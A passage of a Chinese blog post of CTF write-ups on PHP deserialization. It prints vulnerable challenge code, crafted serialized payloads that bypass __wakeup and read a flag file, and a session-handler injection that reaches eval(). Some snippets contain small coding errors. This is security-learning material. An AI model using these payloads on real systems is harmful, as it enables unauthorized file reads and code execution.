23333&#x27;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;key;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;answer&#x27;</span>]))&#123;<br>        show_source(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$answer</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;answer&#x27;</span>];<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$answer</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> unserialize(<span class="hljs-variable">$answer</span>);<span class="hljs-comment">//</span><br>    &#125;<br><br><span class="hljs-comment">//__destruct已经赋值$key=flag 而__wakeup又把变量给覆盖</span><br><span class="hljs-comment">//O:4:&quot;Test&quot;:1:&#123;s:3:&quot;key&quot;;s:4:&quot;flag&quot;;&#125;</span><br><span class="hljs-comment">//O:4:&quot;Test&quot;:2:&#123;s:3:&quot;key&quot;;s:4:&quot;flag&quot;;&#125; 绕过__wakeup</span><br></code></pre></td></tr></table></figure><h4 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="极客大挑战 2019 PHP"></a>极客大挑战 2019 PHP</h4><p><a href="http://www.zip/">www.zip</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//class.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;nonono&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;yesyes&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;password != <span class="hljs-number">100</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You name is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;username;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You password is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;password;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;username === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;<br>            <span class="hljs-keyword">die</span>();  <br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;admin&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;100&#x27;</span>;<br>    <br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Name();<br><span class="hljs-variable">$a</span> = serialize(<span class="hljs-variable">$a</span>);<br>var_dump(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-comment">//手动修改特殊字符以及绕过__Wakeup()</span><br><span class="hljs-comment">//O:4:&quot;Name&quot;:2:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;&#125;</span><br>    <br>    <br><span class="hljs-comment">//有时是url的get传参 那么就可以使用url编码 省去修改特殊字符的操作</span><br><span class="hljs-comment">//$a = str_replace(2,3,$a);    </span><br><span class="hljs-comment">//var_dump(urlencode($a));    </span><br></code></pre></td></tr></table></figure><h4 id="神盾局的秘密"><a href="#神盾局的秘密" class="headerlink" title="神盾局的秘密"></a>神盾局的秘密</h4><p>查看图片元素得到<code>showimg.php?img=c2hpZWxkLmpwZw==</code></p><p>img后面的猜是base64  解码后是shield.jpg</p><p>不断改变base64的值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//showimg.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$f</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>];<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$f</span>)) &#123;<br><span class="hljs-variable">$f</span> = base64_decode(<span class="hljs-variable">$f</span>);<br><span class="hljs-keyword">if</span> (stripos(<span class="hljs-variable">$f</span>,<span class="hljs-string">&#x27;..&#x27;</span>)===<span class="hljs-literal">FALSE</span> &amp;&amp; stripos(<span class="hljs-variable">$f</span>,<span class="hljs-string">&#x27;/&#x27;</span>)===<span class="hljs-literal">FALSE</span> &amp;&amp; stripos(<span class="hljs-variable">$f</span>,<span class="hljs-string">&#x27;\\&#x27;</span>)===<span class="hljs-literal">FALSE</span><br>&amp;&amp; stripos(<span class="hljs-variable">$f</span>,<span class="hljs-string">&#x27;pctf&#x27;</span>)===<span class="hljs-literal">FALSE</span>) &#123;<br>readfile(<span class="hljs-variable">$f</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;File not found!&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><br><span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;shield.php&#x27;</span>;<br>    <span class="hljs-variable">$x</span> = <span class="hljs-keyword">new</span> Shield();<br>    <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;class&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$g</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;class&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$g</span>)) &#123;<br>        <span class="hljs-variable">$x</span> = unserialize(<span class="hljs-variable">$g</span>);<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$x</span> - readfile();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//shield.php</span><br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-comment">//flag is in pctf.php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Shield</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;&#x27;</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;file = <span class="hljs-variable">$filename</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readfile</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-string">&#x27;..&#x27;</span>) === <span class="hljs-literal">false</span> &amp;&amp; stripos(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-string">&#x27;/&#x27;</span>) === <span class="hljs-literal">false</span> &amp;&amp; stripos(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-string">&#x27;\\&#x27;</span>) == <span class="hljs-literal">false</span>) &#123;<br>                <span class="hljs-keyword">return</span> @file_get_contents(<span class="hljs-keyword">$this</span>-&gt;file);<br>            &#125;<br>        &#125;<br>    &#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>直接这样读取pctf.php返回file not found</p><p>构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-comment">//flag is in pctf.php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Shield</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;&#x27;</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;file = <span class="hljs-variable">$filename</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readfile</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-string">&#x27;..&#x27;</span>) === <span class="hljs-literal">false</span> &amp;&amp; stripos(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-string">&#x27;/&#x27;</span>) === <span class="hljs-literal">false</span> &amp;&amp; stripos(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-string">&#x27;\\&#x27;</span>) == <span class="hljs-literal">false</span>) &#123;<br>                <span class="hljs-keyword">return</span> @file_get_contents(<span class="hljs-keyword">$this</span>-&gt;file);<br>            &#125;<br>        &#125;<br>    &#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Shield(pctf.php);<br><span class="hljs-variable">$a</span> = serialize(<span class="hljs-variable">$a</span>);<br>var_dump(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><blockquote><p>index.php?class=O:6:”Shield”:1:{s:4:”file”;s:8:”pctf.php”;}</p></blockquote><h2 id="PHP-session反序列化"><a href="#PHP-session反序列化" class="headerlink" title="PHP session反序列化"></a>PHP session反序列化</h2><blockquote><p> 当session_start()被调用或者php.ini中session.auto_start = 1时，PHP内部调用会话管理器，将用户session序列化以后，存储到指定目录（默认为/tmp）</p></blockquote><h3 id="处理器"><a href="#处理器" class="headerlink" title="处理器"></a>处理器</h3><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/2021/07/10/.png"></p><h3 id="ini中相关的配置"><a href="#ini中相关的配置" class="headerlink" title="ini中相关的配置"></a>ini中相关的配置</h3><p>配置文件php.ini中含有session的相关配置</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">session</span>.save_path=&quot;&quot;   <span class="hljs-comment">--设置session的存储路径,默认在/tmp</span><br><span class="hljs-keyword">session</span>.auto_start   <span class="hljs-comment">--指定会话模块是否在请求开始时启动一个会话,默认为0不启动</span><br><span class="hljs-keyword">session</span>.serialize_handler   <span class="hljs-comment">--定义用来序列化/反序列化的处理器名字。默认使用phpsession.save_handler=&quot;&quot; --设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)，比如files就是session默认以文件的方式进行存储</span><br></code></pre></td></tr></table></figure><h3 id="代码中引擎设置"><a href="#代码中引擎设置" class="headerlink" title="代码中引擎设置"></a>代码中引擎设置</h3><p>在PHP中默认使用的是PHP引擎，如果要修改为其他的引擎，只需要添加代码</p><p><code>ini_set(&#39;session.serialize_handler&#39;, &#39;需要设置的引擎&#39;);</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br>session_start();<br></code></pre></td></tr></table></figure><h3 id="不同引擎存储差异"><a href="#不同引擎存储差异" class="headerlink" title="不同引擎存储差异"></a>不同引擎存储差异</h3><p>php中的session内容是以<strong>文件</strong>方式来存储的，由<code>session.save_handler</code>来决定。文件名由<code>sess_sessionid</code>命名，文件内容则为session序列化后的值，文件位置在ini的<code>session.save_path</code>中    <strong>phpstudy本地位置：/Extensions/tmp/tmp</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php&#x27;</span>);<br>    session_start();<br><br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-string">&#x27;test&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ul><li>当<code>session.serialize_handler</code>为<code>php</code>时</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">name|s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>;<br></code></pre></td></tr></table></figure><ul><li>当<code>session.serialize_handler</code>为<code>php_serialize</code>时</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><ul><li>当<code>session.serialize_handler</code>为<code>php_binary</code>时</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;<span class="hljs-number">0x04</span>&gt;names:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>;<br></code></pre></td></tr></table></figure><h3 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h3><p>PHP中的Session的实现是没有的问题，危害主要是由于程序员的Session使用不当而引起的。如果 PHP 在反序列化存储的 $_SESSION  数据时的使用的处理器和序列化时使用的处理器不同，会导致数据无法正确反序列化，通过特殊的构造，甚至可以伪造任意数据。常见的比如存入session时用的处理器为php_serialize,反序列化时用的处理器是php</p><p><strong>php大于5.5.4的版本中默认使用php_serialize规则</strong></p><p>常见的比如存入session时用的处理器为php_serialize，反序列化时用的处理器是php</p><blockquote><p>当配置选项session.auto_start＝Off，两个脚本注册 Session 会话时使用的序列化处理器不同，就会出现安全问题</p><p>当配置选项session.auto_start＝On会自动注册Session会话，因为该过程是发生在脚本代码执行前，所以在脚本中设定的包括序列化处理器在内的 session 相关配选项的设置是不起作用的，因此一些需要在脚本中设置序列化处理器配置的程序会在session.auto_start＝On时，销毁自动生成的Session会话，然后设置需要的序列化处理器，再调用session_start()函数注册会话，这时如果脚本中设置的序列化处理器与php.ini中设置的不同，就会出现安全问题,因为PHP自动注册Session会话是在脚本执行前，所以通过该方式只能注入PHP的内置类</p></blockquote><p>比如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;ryat&#x27;</span>] = <span class="hljs-string">&#x27;|O:8:&quot;stdClass&quot;:0:&#123;&#125;&#x27;</span>;<br></code></pre></td></tr></table></figure><p>上面的$_SESSION数据 在存储时使用的序列化处理器为php_serialize存储的格式如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;ryat&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;|O:8:&quot;</span><span class="hljs-built_in">stdClass</span><span class="hljs-string">&quot;:0:&#123;&#125;&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>在读取数据时如果用的反序列化处理器不是php_serialize而是php的话 那么反序列化后的数据将会变成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#!php</span><br><span class="hljs-comment">// var_dump($_SESSION);</span><br><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;<br>  [<span class="hljs-string">&quot;a:1:&#123;s:4:&quot;</span>ryat<span class="hljs-string">&quot;;s:20:&quot;</span><span class="hljs-string">&quot;]=&gt;</span><br><span class="hljs-string">  object(stdClass)#1 (0) &#123;</span><br><span class="hljs-string">  &#125;</span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure><p>则反序列化后还原得到一个新的对象 通过注入 <code>|</code> 字符伪造了对象的序列化数据</p><h4 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//s1.php</span><br><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br>session_start();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;spoock&quot;</span>]=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>];<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//s2.php</span><br><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php&#x27;</span>);<br>session_start();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lemon</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hi</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;hi = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;hi);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>先访问一下s2 应为空</p><p>接着访问<code>s1.php?a=|O:5:&quot;lemon&quot;:1:&#123;s:2:&quot;hi&quot;;s:14:&quot;echo &quot;spoock&quot;;&quot;;&#125;</code></p><p>然后访问一下s2 回显spoock，传入的数据会按照<strong>php_serialize</strong>来进行序列化。 此时访问us2.php时，页面输出，<code>spoock</code>成功执行了我们构造的函数。因为在访问us2.php时，程序会按照<strong>php</strong>来反序列化SESSION中的数据，实例化lemon对象，session反序列化会执行里面销毁前的魔术函数<code>__destruct()</code>，前面的<code>__construct()</code>就不再执行了。</p><h3 id="题"><a href="#题" class="headerlink" title="题"></a>题</h3><h4 id="ctfshow-1"><a href="#ctfshow-1" class="headerlink" title="ctfshow"></a>ctfshow</h4><ul><li>ctfshow263</li></ul><p>下载源码，代码审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><br><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>session_start();<br><span class="hljs-comment">//超过5次禁止登陆</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]))&#123;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;limti&#x27;</span>]&gt;<span class="hljs-number">5</span>?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;登陆失败次数超过限制&quot;</span>):<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]=base64_decode(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]);<br><span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;limit&#x27;</span>] = base64_encode(base64_decode(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]) +<span class="hljs-number">1</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br> setcookie(<span class="hljs-string">&quot;limit&quot;</span>,base64_encode(<span class="hljs-string">&#x27;1&#x27;</span>));<br> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]= <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>注意此处有</p><blockquote><p>session_start(); </p><p>这个审计下来五次登录错误就禁止了，但仔细一看<code>$_SESSION[&#39;limti&#39;]&gt;5</code>拼写有误，就是吓人的，下面两行代码必定执行</p><p>$_SESSION[‘limit’]=base64_decode($_COOKIE[‘limit’]); </p><p>$_COOKIE[‘limit’] = base64_encode(base64_decode($_COOKIE[‘limit’]) +1);</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//check.php</span><br><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;inc/inc.php&#x27;</span>;<br><span class="hljs-variable">$GET</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;u&quot;</span>=&gt;<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>],<span class="hljs-string">&quot;pass&quot;</span>=&gt;<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$GET</span>)&#123;<br><span class="hljs-variable">$data</span>= <span class="hljs-variable">$db</span>-&gt;get(<span class="hljs-string">&#x27;admin&#x27;</span>,<br>[<span class="hljs-string">&#x27;id&#x27;</span>,<br><span class="hljs-string">&#x27;UserName0&#x27;</span><br>],[<br><span class="hljs-string">&quot;AND&quot;</span>=&gt;[<br><span class="hljs-string">&quot;UserName0[=]&quot;</span>=&gt;<span class="hljs-variable">$GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>],<br><span class="hljs-string">&quot;PassWord1[=]&quot;</span>=&gt;<span class="hljs-variable">$GET</span>[<span 